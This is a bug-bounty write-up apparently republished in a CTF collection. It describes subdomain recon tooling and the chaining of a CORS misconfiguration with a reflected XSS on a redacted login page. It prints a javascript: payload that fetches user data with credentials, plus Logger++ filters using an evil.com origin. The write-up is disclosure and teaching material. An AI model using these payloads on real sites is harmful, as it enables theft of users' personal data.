# :globe_with_meridians: Chaining CORS by Reflected XSS to Steal Sensitive Data

> **Original Source:** [Chaining CORS by Reflected XSS to Steal Sensitive Data](https://infosecwriteups.com/chaining-cors-by-reflected-xss-to-steal-sensitive-data-c456e133c10d)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Chaining CORS by Reflected XSS to Steal Sensitive Data


Hello, everyone.
I hope you are doing well.
My name is Mohammad Reza Omrani and in this post, I will describe a vulnerability I recently discovered.


We used the domain name redacted.com and collected as many subdomains as possible through Google Dorking.


```
site:"*.redacted.com"
```


I added the new subdomains I found from Google results to a text file. Since this was a manual and time-consuming process, I tried to speed things up like this:


```
site:"*.redacted.com" -www -blog -mail
```


By using a specific filter, you can exclude a term, such as a subdomain, from Google search results. After that, I utilized passive enumeration tools like subfinder, assetfinder, and amass to gather a list of subdomains associated with the target and saved them in a text file.


```
subfinder -d redacted.com -all -silent -nc -o subdomains.txt
assetfinder --subs-only redacted.com | sort -u >> subdomains.txt
amass enum -passive -d redacted.com -silent -nocolor | sort -u >> subdomains.txt
```


After executing a command, I use “sort -u” to eliminate duplicates. However, tools like anew and Deduplicate can be helpful in this process.

>

After the passive enumeration, I save the output to a file for DNS resolution.


I utilized the Shuffledns tool to perform Subdomain Bruteforce and saved the resulting output in a file named subdomains.txt.


```
shuffledns -d redacted.com -r massdns/lists/resolvers.txt -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -silent -nc | sort -u >> subdomains.txt
```


In the Subdomain Permutation step, I used the Altrex tool to create a new list of subdomains with permutations.


```
cat subdomains.txt | alterx -silent -o subdomain-permutation.txt
```


Apart from other tools, one can also utilize the dnsgen tool. While working on DNS resolving, I used the massdns tool. Although dnsx is also a viable option, previous tests revealed that massdns performs much faster.


```
cat subdomain-permutation.txt | massdns -r /root/massdns/lists/resolvers.txt -o L -w dns-resolving.txt
```


Now that we’ve completed this section, the next step is Service Discovery, which I accomplish using the httpx tool.


The steps I’ve explained to you so far are a summary of my automation tool’s Recon process. My goal in designing this tool was to ensure optimal and efficient performance. This means avoiding redundancy and minimizing the need to repeat processes.


I have provided a brief explanation of the Recon process using my automation tool. To avoid repetition and redundancy, I suggest utilizing the httpx tool in the following manner. Afterwards, we can create our automation tool with the help of the awk command and select the desired columns.


I used httpx like this:


```
cat dns-resolving.txt | httpx -sc -title -td -favicon -asn -silent -nc -o service-discovery.txt
```


I organized the output of this step based on their status codes in order to group them into separate text files for each range (such as 200 or 300). Afterwards, I utilized the EyeWitness tool to capture a screenshot of the text file containing the status code range of 200. EyeWitness is a tool that is specifically designed to take screenshots of web pages.


I utilized EyeWitness output to gain access to the domains and then employed Burp Suite to capture requests and responses.


In the meantime, I also used the Logger++ extension, which allows us to define advanced filters to identify suspicious or vulnerable endpoints based on our logs.


I will introduce you to a repository that contains useful filters for hunting. I have modified some series based on my methodology and am now continuously using them.


## Get Mohammad Reza Omrani’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


I discovered the Cors Misconfiguration vulnerability using this filter.


```
Request.Headers CONTAINS "origin" AND (Response.Headers CONTAINS "Access-Control-Allow-Credentials" OR Response.Headers CONTAINS "Access-Control-Allow-Origin")
```


Besides, you can use Logger++ in combination with the AutoRepeater extension. In AutoRepeater, add a replacement that adds or replaces the origin header with the desired value in the headers.


or


Finally, in Logger++, you can apply a filter to find vulnerable endpoints, in addition to AutoRepeater.


```
Request.Headers CONTAINS "origin: evil.com" AND (Response.Headers CONTAINS "Access-Control-Allow-Credentials" OR Response.Headers CONTAINS "Access-Control-Allow-Origin: evil.com")
```


It was surprisingly easy to reach the vulnerable endpoint. Initially, I used Logger++ and applied the first filter. By sending one of the suspicious endpoints to Repetear, I discovered that only the subdomain was vulnerable.


I have noticed that the Response Body of a certain endpoint displays personal information such as full names, email addresses, and mobile numbers. This made me more determined to search for an XSS vulnerability on one of my target subdomains. I continued to check the EyeWitness output, and after a few minutes, I found a suspicious login page that might have an open redirect and XSS vulnerability.


```
https://subdomain.redacted.com/login/mobile?next=https://subdomain.redacted.com
```


First, I checked for an open redirect vulnerability and then proceeded to the XSS test.


```
https://subdomain.redacted.com/login/mobile?next=javascript:alert(document.domain)
```


I executed an XSS attack after entering my mobile number and OTP code.


After some experimentation, I discovered an exploit that leverages both vulnerabilities to achieve the desired outcome.


```
https://subdomain.redacted.com/login/mobile?next=javascript:function(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(xhttp.readyState==4&&xhttp.status==200){alert(xhttp.responseText);}};xhttp.open("GET","https://api.redacted.com/api/v2/user",true);xhttp.withCredentials=true;xhttp.send();})();
```


After logging in again, the JavaScript code executed and displayed the user information.
I reported this issue to the relevant company’s security team, but unfortunately, my report was already duplicated. Nonetheless, I wanted to share the discovery process with you.


I hope this information was helpful, and I am looking forward to your feedback on the matter.


Persian Version:


[https://vrgl.ir/0OXCW](https://vrgl.ir/0OXCW)

---

*Originally published on [Medium](https://infosecwriteups.com/chaining-cors-by-reflected-xss-to-steal-sensitive-data-c456e133c10d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
